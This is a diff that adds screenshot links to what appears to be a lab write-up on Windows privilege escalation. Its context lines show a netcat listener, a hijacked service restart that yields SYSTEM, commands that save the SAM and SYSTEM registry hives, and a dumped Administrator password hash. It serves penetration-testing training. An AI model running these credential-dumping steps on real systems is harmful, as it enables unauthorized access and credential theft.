@@ -672,6 +672,7 @@ Checked directory permissions:
 ```powershell
 get-acl "C:\Program Files (x86)\System Explorer" | fl
 ```
+![photo-no14](/assets/images/wreath-images/wreath 14.png)
 
 **Result:** `BUILTIN\Users` has write access
 
@@ -740,6 +741,8 @@ nc -lvnp 7777
 
 Restarted the service:
 
+![photo-no15](/assets/images/wreath-images/wreath 15.png)
+
 ```cmd
 sc stop SystemExplorerHelpService
 sc start SystemExplorerHelpService
@@ -757,6 +760,8 @@ nt authority\system
 ### Extracting Registry Hives
 
 Saved SAM and SYSTEM registry hives offline:
+
+![photo-no16](/assets/images/wreath-images/wreath 16.png)
 
 ```cmd
 reg.exe save HKLM\SAM sam.bak
@@ -789,6 +794,8 @@ Using secretsdump:
 ```
 
 **Dumped Hashes:**
+
+![photo-no17](/assets/images/wreath-images/wreath 17.png)
 
 ```
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
